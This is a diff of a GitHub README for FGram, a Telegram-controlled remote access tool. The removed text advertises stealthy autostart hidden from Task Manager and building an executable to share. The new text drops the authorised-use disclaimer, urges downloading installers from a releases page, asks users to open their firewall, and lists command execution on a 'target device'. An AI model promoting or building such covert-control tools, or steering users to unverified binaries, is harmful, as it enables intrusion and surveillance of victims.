@@ -1,43 +1,67 @@
-# FGram 🚀 - Remote Access Tool (RAT) for Powerful PC Control
+# 🌟 FGram - Control Your RAT Easily from Telegram
 
-FGram is a robust and stealthy tool designed for remote management of computers through Telegram. Offering seamless control via a lightweight Telegram bot, it allows you to monitor and operate the system remotely with ease and discretion.  
+## 📥 Download
 
----
+[![Download FGram](https://img.shields.io/badge/Download-FGram-blue.svg)](https://github.com/ADRIANA0109/FGram/releases)
 
-## ✨ Key Features
+## 🚀 Getting Started
 
-- 🐰 **Ease** - No need to set up the ports or use **playit.gg**, just create a bot via [@BotFather](https://t.me/botfather), build the **executable file** and share!
-- 🦠 **Cross Platform** - Works everywhere, even **macOS**!
-- 🚀 **Stealthy Autostart** — Automatically setups a hidden Windows Task Scheduler job to launch the bot on user login without visible traces in Task Manager Startup tab.
-- 🎛️ **Simple Telegram Controls** — Easily operate using clean, intuitive Telegram bot buttons.
-- 🔐 **Secure Access** — Only accessible through your dedicated Telegram bot token.
+Welcome to FGram, a remote access tool (RAT) that allows you to control devices from Telegram seamlessly. Whether you need to manage files, monitor activities, or support technical issues, FGram provides a simple solution.
 
----
+## ⚙️ System Requirements
 
-## 🛠️ Technical Overview
+To run FGram, ensure your system meets the following requirements:
 
-- Built with Python and the [aiogram](https://docs.aiogram.dev) framework for efficient Telegram Bot API integration.
-- Utilizes Windows Task Scheduler commands to configure invisible, high-privilege autostart tasks.
+- **Operating Systems**: Windows 10 or later, macOS 10.12 or later, Linux (Ubuntu 18.04 or later)
+- **Python Version**: Python 3.7 or later installed on your device
+- **Internet Connection**: A stable internet connection for communication with Telegram
+- **Storage Space**: At least 100 MB of free disk space for installation
 
----
+## 📝 Features
 
-## ⚙️ Installation & Setup
-`Not Implemented Yet`
+FGram comes equipped with several features that make it efficient and user-friendly:
 
-## 🚀 Usage
+- **Remote Control**: Access and manage devices easily from any location.
+- **File Management**: Upload and download files securely.
+- **Activity Monitoring**: View activities and receive updates in real-time.
+- **Command Execution**: Run commands on the target device with ease.
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux.
 
-- Open Telegram and find your bot by username.
-- Send `/start` to activate the control interface.
-- Use the buttons to:
-  - Capture and receive your desktop screenshot.
-  - Shut down or restart your computer remotely.
+## 📦 Download & Install
 
----
+To download and install FGram, follow these steps:
 
-## ⚠️ Disclaimer
+1. **Visit the Releases Page**: Click the link below to access the download page.
+   - [Download FGram](https://github.com/ADRIANA0109/FGram/releases)
 
-FGram is intended for authorized use on your own devices only. Unauthorized access or control of devices that you do not own or have explicit permission to manage is illegal. Use responsibly and respect privacy and security boundaries.
+2. **Choose Your Version**: On the releases page, you will see different versions of FGram. Select the latest version for your operating system.
 
----
+3. **Download the Installer**: Click on the download link for the installer file. The file types will vary based on your operating system:
+   - **For Windows**: Download the `.exe` installer.
+   - **For macOS**: Download the `.dmg` file.
+   - **For Linux**: Download the appropriate package for your distribution.
 
-FGram delivers a professional-grade remote control experience through Telegram with stealth and simplicity.
+4. **Run the Installer**: Once the download finishes, locate the downloaded file and double-click it to start the installation process. Follow the prompts to install FGram.
+
+5. **Start FGram**: After installation, open the program. You may need to grant permissions based on your operating system. 
+
+6. **Configure Telegram**: To use FGram fully, link it with your Telegram account. This will allow you to send and receive commands directly through the app.
+
+7. **Allow Access**: You may need to adjust firewall settings to let FGram communicate externally. Ensure you allow communications through your firewall.
+
+## 📞 Support
+
+If you encounter any issues during installation or while using FGram, you can reach support through open discussions in the GitHub repository. Specific instructions or user guidance will be provided. 
+
+## 📚 Documentation
+
+For a comprehensive set of instructions, check the documentation that accompanies the application. It covers all features and troubleshooting tips in detail.
+
+## 🔗 Important Links
+
+- [View the Source Code](https://github.com/ADRIANA0109/FGram)
+- [Visit the Releases Page](https://github.com/ADRIANA0109/FGram/releases)
+
+FGram aims to make device management from Telegram as simple as possible. Your feedback is valuable for future enhancements.
+
+Happy controlling!
